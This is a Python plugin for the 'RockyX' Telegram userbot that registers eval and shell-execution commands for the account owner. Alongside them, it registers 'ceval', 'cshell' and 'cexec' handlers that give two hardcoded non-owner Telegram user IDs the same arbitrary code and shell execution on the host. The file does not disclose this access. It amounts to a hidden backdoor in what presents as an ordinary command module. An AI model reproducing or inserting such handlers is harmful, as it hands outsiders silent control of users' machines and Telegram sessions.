from RockyX import *
from RockyX.lib import *

@M3_4_U(command("screenls", cmd) & owner)
async def screen_command(c: Client, m: Message):
    await screen(c, m)

@M3_4_U(command(["ceval", "cev", "ce"], cmd) & filters.user([1191668125, 901878554]) & ~owner)
@M3_4_U(command(["eval", "ev", "e"], cmd) & owner)
async def eval_command(client: Client, message: Message):
    await evaluation_cmd_t(client, message)

@M3_4_U_edited(command(["cshell", "cexec"], cmd) & filters.user([1191668125, 901878554]) & ~owner)
@M3_4_U_edited(command(["shell", "exec"], cmd) & filters.me)
async def execution_func_edited(bot: Client, message: Message):
    await execution(bot, message)

@M3_4_U(command(["cshell", "cexec"], cmd) & filters.user([1191668125, 901878554]) & ~owner)
@M3_4_U(command(["shell", "exec"], cmd) & owner)
async def execution_func(bot: Client, message: Message):
    await execution(bot, message)
